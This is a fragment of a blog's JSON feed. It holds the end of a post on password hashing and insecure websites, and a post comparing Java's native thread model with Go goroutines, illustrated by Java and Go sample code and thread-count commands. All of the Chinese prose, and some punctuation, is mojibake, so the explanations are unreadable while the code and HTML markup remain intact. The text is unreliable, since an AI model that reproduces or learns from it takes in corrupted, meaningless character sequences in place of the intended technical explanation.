ç‚ºç¶²ç«™è‡ªå·±éƒ½ä¸çŸ¥é“æˆ‘çš„å¯†ç¢¼æ˜¯ä»€éº¼ã€‚é›–ç„¶è½èµ·ä¾†ä¸å¤ªå¯èƒ½ï¼Œä½†å¯¦éš›ç‹€æ³å°±æ˜¯å¦‚æ­¤ã€‚ç‚ºäº†å®‰å…¨æ€§ï¼Œé€™æ˜¯å¿…é ˆçš„æ‰‹æ®µã€‚</p>\n<p>è¦é”æˆé€™æ¨£çš„ç›®çš„ï¼ŒèƒŒå¾Œæœ€é‡è¦çš„æŠ€è¡“åŸç†å°±æ˜¯ hashï¼Œã€ŒåŒæ¨£çš„å¯†ç¢¼æœƒç”¢ç”ŸåŒæ¨£çš„ hash å€¼ï¼Œä½†å¾ hash å€¼æ²’è¾¦æ³•å°æ‡‰å›åŸæœ¬çš„å¯†ç¢¼ã€å°±æ˜¯ç§˜è¨£æ‰€åœ¨ã€‚</p>\n<p>åä¹‹ï¼Œå¦‚æœä½ ç™¼ç¾æœ‰ç¶²ç«™å¯ä»¥æ‰¾å›ä½ çš„å¯†ç¢¼ï¼Œé‚£å°±å¾—è¦å¤šåŠ æ³¨æ„ï¼Œæœ‰å¯èƒ½ç¶²ç«™è³‡æ–™åº«å­˜çš„ä¸æ˜¯ hash å€¼è€Œæ˜¯ä½ çš„å¯†ç¢¼ã€‚åœ¨é€™ç¨®ç‹€æ³ä¸‹ï¼Œè¬ä¸€æœ‰å¤©è³‡æ–™åº«è¢«å…¥ä¾µï¼Œå¸³å¯†è¢«å·èµ°ï¼Œé§­å®¢å°±èƒ½å¾—çŸ¥ä½ çœŸå¯¦çš„å¯†ç¢¼ï¼Œç„¶å¾Œå»è©¦å…¶ä»–çš„æœå‹™ã€‚</p>\n<p>æœ‰é—œæ–¼å¯†ç¢¼ç®¡ç†ï¼Œç¾åœ¨ç€è¦½å™¨ä¹Ÿæœ‰åŠŸèƒ½å¯ä»¥è‡ªå‹•å¹«ä½ ç”¢ç”Ÿå¯†ç¢¼å¤–åŠ è¨˜æ†¶å¯†ç¢¼ï¼Œæˆ–ä¹Ÿå¯ä»¥ä½¿ç”¨ç¾æˆçš„å¯†ç¢¼ç®¡ç†è»Ÿé«”ï¼Œéƒ½å¯ä»¥åœ¨ä¸åŒç¶²ç«™ç”¢ç”Ÿä¸åŒçš„å¯†ç¢¼ã€‚</p>\n<p>é€™ç¯‡å¸Œæœ›èƒ½è®“å°é€™å€‹é ˜åŸŸé™Œç”Ÿçš„è®€è€…å€‘ä¹Ÿèƒ½çŸ¥é“ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µï¼ŒåŒ…æ‹¬ï¼š</p>\n<ol>\n<li>æœ‰äº›ç¶²ç«™æ¯”ä½ æƒ³å¾—è„†å¼±å¾ˆå¤šï¼Œæ”¹å€‹ç¶²å€å°±å¯ä»¥æ‹¿åˆ°åˆ¥äººçš„è³‡æ–™</li>\n<li>å°æ–¼å®‰å…¨æ€§åšå¾—ä¸å¥½çš„ç¶²ç«™ï¼Œæ‹¿åˆ°æ•´å€‹è³‡æ–™åº«ä¸æ˜¯ä¸€ä»¶é›£äº‹</li>\n<li>å¿˜è¨˜å¯†ç¢¼åªèƒ½é‡è¨­ï¼Œä¸èƒ½æ‰¾å›ï¼Œæ˜¯å› ç‚ºç¶²ç«™ä¹Ÿä¸çŸ¥é“ä½ çš„å¯†ç¢¼</li>\n<li>å¦‚æœæœ‰ç¶²ç«™å¯ä»¥æŠŠèˆŠå¯†ç¢¼çµ¦ä½ ï¼Œé‚£ä½ å¾—è¦å°å¿ƒä¸€é»</li>\n</ol>\n",
      "date_published": "2021-07-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "title": "Javaâ€™s Thread Model and Golang Goroutine",
      "content_html": "<!-- summary -->\n<p>èªªåˆ° Golangï¼Œç¸½æœƒæåˆ°å…¶é«˜ä½µç™¼çš„ç‰¹æ€§ï¼Œè€Œ goroutine å‰‡æ˜¯æ’èµ· Golang é«˜ä½µç™¼çš„åŸºç¤ã€‚æœ¬æ–‡è©¦è‘—æ¯”è¼ƒ Java thread å’Œ Golng goroutine åœ¨ OS é‹è¡Œçš„æ–¹å¼ï¼Œè®“å¤§å®¶èƒ½ç†è§£ goroutine åœ¨è¨­è¨ˆä¸Šçš„ç¨åˆ°ä¹‹è™•ã€‚</p>\n<!-- summary -->\n<h1 id=\"java-thread\"><a class=\"direct-link\" href=\"#java-thread\">#</a> Java Thread</h1>\n<p>Java thread ç›´æ¥ä½¿ç”¨ OS æä¾›çš„ native threadï¼Œå³æ˜¯æ¯ä¸€å€‹ Java thread éƒ½æ˜¯å°æ‡‰ OS çš„ threadï¼Œå®Œå…¨ä¾è³´ OS å»æ’ç¨‹èª¿åº¦ï¼š</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png\" alt=\"\"></p>\n<p>ä¸‹é¢æ˜¯ä¸€æ®µç°¡å–®çš„ Java codeï¼Œå…§å®¹æ˜¯å‰µå»º 1000 å€‹ threadï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç•¶ä½ åœ¨ linux ä¸Šè·‘èµ·ä¾†ç”¨ ps æŒ‡ä»¤è§€å¯Ÿ java ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°è©²ç¨‹åºä½¿ç”¨äº† 1018 å€‹ thread (å…¶ä¸­ 18 å€‹ç‚º jvm æœ¬èº«ç³»çµ±ä½¿ç”¨çš„ threadï¼Œä¾‹å¦‚ GC ä¹‹é¡çš„)ã€‚</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">102763</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><span class=\"token number\">1018</span></code></pre>\n<p>ä½†éš¨è‘—æ™‚ä»£æ¼”é€²ï¼Œæ›¾ç¶“è¢«ç¨±ç‚º lightweight process çš„ threadï¼Œä¹Ÿé€æ¼¸ç„¡æ³•æ‡‰ä»˜é«˜ä½µç™¼çš„å ´æ™¯ã€‚</p>\n<h2 id=\"%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\">#</a> åŸç”Ÿ ThreadÂ çš„å•é¡Œ</h2>\n<ol>\n<li>è¨˜æ†¶é«”<br>\nJava æ¯å‰µå»ºä¸€å€‹ thread éƒ½æœƒåˆ†é…ä¸€å€‹å›ºå®šçš„ memory ä½œç‚º stack ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯ OS çš„è¨˜æ†¶é«”å’Œ SWAP ç©ºé–“æœƒé™åˆ¶ Java Application å‰µå»º thread çš„æ•¸é‡ä¸Šé™ï¼Œå³ä¾¿ Java Application å¯¦éš›ä¸Šæ²’ç”¨åˆ°é€™éº¼å¤šè¨˜æ†¶é«”ã€‚<br>\nå¦å¤–ä½ å¯ä»¥åœ¨å•Ÿå‹• Java æ™‚ç”¨ -Xss æŒ‡ä»¤æŒ‡å®š thread ä½”ç”¨çš„è¨˜æ†¶é«”å¤§å°ï¼Œä½†å¯¦éš›ä¸Šå¤ªå°ä¹Ÿæœƒå°è‡´ Jvm ç„¡æ³•å•Ÿå‹•ã€‚åƒæˆ‘çš„ç­†é›»æŒ‡å®šè¨˜æ†¶é«”å°æ–¼ 135k å°±æœƒå‡ºéŒ¯ã€‚</li>\n<li>å‰µå»º thread å’Œ Context Switch çš„é–‹éŠ·<br>\nç•¶ thread æ•¸é‡è¶…é core æ•¸é‡çš„æ™‚å€™ï¼ŒOS æœƒé€éæ’ç¨‹ç›¡å¯èƒ½è®“æ¯å€‹ thread éƒ½èƒ½å…¬å¹³çš„ä½”ç”¨ coreï¼Œè€Œ core æŠŠåŸ·è¡Œåˆ°ä¸€åŠçš„ thread ç‹€æ…‹å­˜èµ·ä¾†ï¼Œåˆ‡æ›åˆ°å¦ä¸€å€‹ thread åŸ·è¡Œå°±æ˜¯ Context Switchã€‚<br>\ncontext switch æœ¬èº«ä¹Ÿæ˜¯æœƒä½”ç”¨ core é‹ç®—è³‡æºçš„ã€‚ç•¶ thread æ•¸é‡éå¤šæ™‚ï¼Œæœƒé€ æˆ core èŠ±åœ¨å‰µå»º/éŠ·æ¯€ thread å’Œ Context Switchä¸Šçš„æ¯”ä¾‹è®Šå¤šï¼Œè®Šç›¸æ¸›å°‘ throughputã€‚</li>\n</ol>\n<p>ä¸‹é€™æ˜¯ä¸€æ®µæ®µç”¨ ExecutorService çš„ thread pool åŸ·è¡Œ 200000 æ¬¡ doSomething function çš„ java codeï¼Œç”¨ä¾†å¯¦é©— thread çš„é–‹éŠ·æœ‰å¤šæ˜‚è²´ï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">int</span> anInt <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> threadNum <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span>threadNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">200000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">awaitTermination</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">TimeUnit</span><span class=\"token punctuation\">.</span>NANOSECONDS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>æˆ‘å˜—è©¦æŠŠ thread poll çš„ thread æ•¸é‡å¾ 100~9000 å»åŸ·è¡Œï¼Œå»æ¯”è¼ƒåŸ·è¡Œæ™‚é–“ï¼š</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png\" alt=\"\"></p>\n<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨è¶Šå¤š thread æ•¸é‡è¶Šé«˜åè€ŒåŸ·è¡Œæ™‚é–“è¶Šä¹…ã€‚è©¦è‘— profile ç¨‹å¼å¯ä»¥çœ‹åˆ°ç•¶ thread num ç‚º 100 æ™‚ï¼Œcpu èŠ±åœ¨ <em>doSomething çš„æ™‚é–“ä½”æ¯”ç´„ç‚º 51%ï¼Œå¦‚ä¸‹ï¼š</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png\" alt=\"\"></p>\n<p>è€Œç•¶ thread num ç‚º 9900 æ™‚ï¼Œ<strong><em>doSomething</em></strong> <em>çš„ cpu ä½”ç”¨æ™‚é–“æ¯”ä¾‹é©Ÿé™åˆ° 27%ã€‚</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png\" alt=\"\"></p>\n<p>ç¨®ç¨®è·¡è±¡éƒ½å‘Šè¨´æˆ‘å€‘ï¼Œthread æ˜‚è²´çš„é–‹éŠ·ï¼Œè®“ Java åœ¨é«˜ä½µç™¼çš„å ´æ™¯æ˜¯ç•¥é¡¯ç„¡åŠ›çš„ã€‚</p>\n<h1 id=\"goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\"><a class=\"direct-link\" href=\"#goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\">#</a> Goroutine æ€éº¼åšï¼Ÿ</h1>\n<p>ç›¸è¼ƒ Java ä½¿ç”¨ native threadï¼Œä¾è³´ OS åŸç”Ÿçš„ scheduler å»èª¿åº¦ï¼Œgoroutine å¯¦ä½œè‡ªå·±çš„ schedulerï¼Œè‡ªè¡Œèª¿åº¦ goroutinue åœ¨å›ºå®šçš„ thread é–“åŸ·è¡Œï¼š</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png\" alt=\"\"></p>\n<p>Thread å¤§ç´„æ¯åŸ·è¡Œä¸€å€‹ goroutine 10ms å°±æœƒåˆ‡æ›åˆ°å¦ä¸€å€‹ threadã€‚è€Œ thread æŒ‘é¸ goroutine çš„å„ªå…ˆé †åºç‚º</p>\n<ol>\n<li>æ¯å€‹ thread å„è‡ªçš„ queue ä¸­çš„ goroutine</li>\n<li>global queue ä¸­çš„ goroutine</li>\n<li>å¾å…¶ä»– thread çš„ queue ç«Šå– (work-stealing)</li>\n</ol>\n<blockquote>\n<p>Golang ç”¨ GOMAXPROCS é€™åƒæ•¸æ±ºå®š gouroutine ä½¿ç”¨å¤šå°‘ threadï¼Œé è¨­æ˜¯ core æ•¸é‡ã€‚</p>\n</blockquote>\n<p>å¯¦éš›çœ‹ä¸€ä¸‹åœ¨ linux ä¸Šè·‘ goroutine çš„ thread æ•¸é‡ï¼Œä¸‹é¢æ˜¯åŸ·è¡Œçš„ golang code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å¯¦éš›åœ¨æˆ‘çš„é–‹ç™¼ç’°å¢ƒè§€å¯Ÿ thread æ•¸é‡éƒ½åœ¨ 4~6 å·¦å³ã€‚</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">5</span></code></pre>\n<h2 id=\"goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\"><a class=\"direct-link\" href=\"#goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\">#</a> Goroutine çš„è¨˜æ†¶é«”</h2>\n<p>ä¸€é–‹å§‹å‰µå»º goroutine æ™‚æœƒå…ˆåˆ†é… 4k çš„è¨˜æ†¶é«”ï¼Œéš¨è‘— goroutine ä½¿ç”¨é‡æœƒå‹•æ…‹æ“´å±•ã€‚ç›¸è¼ƒ Java çš„ thread æ¨¡å‹ï¼Œgolang æœƒæ¯”è¼ƒé›£è¢«è¨˜æ†¶é«”å¤§å°é™åˆ¶è‘—ä¸Šé™ã€‚</p>\n<h2 id=\"blocking-system-call\"><a class=\"direct-link\" href=\"#blocking-system-call\">#</a> Blocking SystemÂ Call</h2>\n<p>ç›®å‰ç‚ºæ­¢çœ‹èµ·ä¾†å¾ˆç¾å¥½ï¼Œä½†å¦‚æœ thread è¢« blocking system call å¡ä½å‘¢ (ex. è®€å¤§æª”æ¡ˆ)ï¼Ÿä¾‹å¦‚ä¸‹åœ–æœ‰ä¸‰å€‹ goroutine é€é io system call è®€å¤§æª”æ¡ˆï¼Œæ­¤æ™‚æœƒå°è‡´å…¨éƒ¨çš„ goroutinue åªä¾è³´ä¸€å€‹ thread åŸ·è¡Œï¼Œå¤§å¹…æ¸›å°‘ core çš„åˆ©ç”¨ç‡ã€‚</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png\" alt=\"\"></p>\n<p>ç‚ºäº†è§£æ±ºé€™å•é¡Œï¼Œgolang åœ¨ thread å’Œ goroutine é–“å†éš”ä¸€å±¤ process å¦‚ä¸‹ï¼š</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png\" alt=\"\"></p>\n<p>è€Œç•¶æœ‰ thread è¢« system call block ä½æ™‚ï¼Œgolang æœƒå¦å¤–å‰µå»ºæ–°çš„ thread æ¥æ‰‹è©² processor çš„å·¥ä½œï¼Œè€ŒåŸæœ¬çš„ thread å‰‡ç¹¼çºŒåŸ·è¡Œ system callã€‚</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png\" alt=\"\"></p>\n<p>å¯¦éš›ç”¨ä¸‹é¢çš„ codeï¼Œé–‹ 1000 å€‹ goroutine è®€å¤§æª”æ¡ˆæ¸¬è©¦ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tfi<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bigfile\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token keyword\">defer</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tbuf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\tn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> err <span class=\"token operator\">!=</span> io<span class=\"token punctuation\">.</span>EOF <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token operator\">==</span> n <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">break</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>è·‘èµ·ä¾†ä»¥å¾Œè§€å¯Ÿè©²ç¨‹å¼å•Ÿå‹•çš„ thread æœƒå¢åŠ åˆ° 1xxï¼š</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">142</span></code></pre>\n<p>ç”±æ­¤æˆ‘å€‘ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œç•¶ Golang é »ç¹é–‹ goroutine å» call blocking system call æ™‚ï¼Œå…¶ä½µç™¼é‡å¯èƒ½æœƒé€€åŒ–åˆ° Java ä½¿ç”¨ native thread ä¸€æ¨£ã€‚</p>\n<blockquote>\n<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥äº†è§£ goroutine schedulerï¼Œå¯ä»¥åƒè€ƒ <a href=\"https://www.youtube.com/watch?v=-K11rY57K7k&amp;t=316s&amp;ab_channel=Hydra\">Go scheduler: Implementing language with lightweight concurrency</a>ã€‚</p>\n</blockquote>\n<h1 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h1>\n<p>ç›®å‰ç‚ºæ­¢æˆ‘å€‘è¨è«–äº† Java å¦‚ä½•å¯¦ç¾ä½µç™¼å’Œé¢è‡¨çš„å•é¡Œï¼Œä»¥åŠ goroutine å¦‚ä½•åœ¨è§£æ±ºé€™äº›å•é¡Œã€‚ä½†é€™ä¸ä»£è¡¨ Java å°é«˜ä½µç™¼æŸæ‰‹ç„¡ç­–ã€‚</p>\n<p>å¯¦éš›ä¸Šç›®å‰ Java æœ‰å€‹ <a href=\"https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads\">Loom Project</a>ï¼Œå°±æ˜¯è¦åœ¨ JVM ä¸Šå¯¦ä½œé¡ä¼¼ goroutine æ©Ÿåˆ¶çš„ virtual threadã€‚æˆ–è¨±åœ¨ä¸‹ä¸€å€‹ Java çš„ LTS ç‰ˆæœ¬ï¼Œæˆ‘å€‘å°±èƒ½åœ¨ Java ä¸Šæ„Ÿå— Goroutine è¼•å·§ã€‚</p>\n<blockquote>\n<p>é¡Œå¤–è©±ï¼Œæˆ‘å€‹äººè¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„é»æ˜¯ Java 1.2 å‰ Java çš„ thread è¨­è¨ˆå…¶å¯¦è·Ÿ goroutine å¾ˆåƒï¼Œæ˜¯åœ¨ OS thread ä¸Šè·‘ Java threadï¼Œä½†åœ¨å¤šæ ¸å¿ƒçš„ç’°å¢ƒé‡åˆ°ä¸€äº›æ•ˆèƒ½å•é¡Œæ‰åœ¨ Java 1.3 ä»¥å¾Œæ”¹ç‚ºä½¿ç”¨ native threadã€‚ä½†éš¨è‘—æ™‚ä»£æ¼”é€²ï¼ŒJava åˆè¦æ”¹å›åœ¨ thread ä¸Šè·‘ thread çš„è¨­è¨ˆã€‚</p>\n</blockquote>\n<blockquote>\n<p>è®“æˆ‘ä¸ç¦æƒ³ï¼šæœƒä¸æœƒæœªä¾†æœ‰ä¸€å¤© OS æœ‰åŸç”Ÿé¡ä¼¼ goroutine çš„æ©Ÿåˆ¶ä»¥å¾Œï¼Œå„å¤§èªè¨€åˆæœƒåˆè½‰è€Œæ”¹ä½¿ç”¨ OS åŸç”Ÿçš„ä½µç™¼æ©Ÿåˆ¶å‘¢ï¼Œè€Œä¸ä½¿ç”¨è‡ªå·±å¯¦ä½œçš„ scheduler 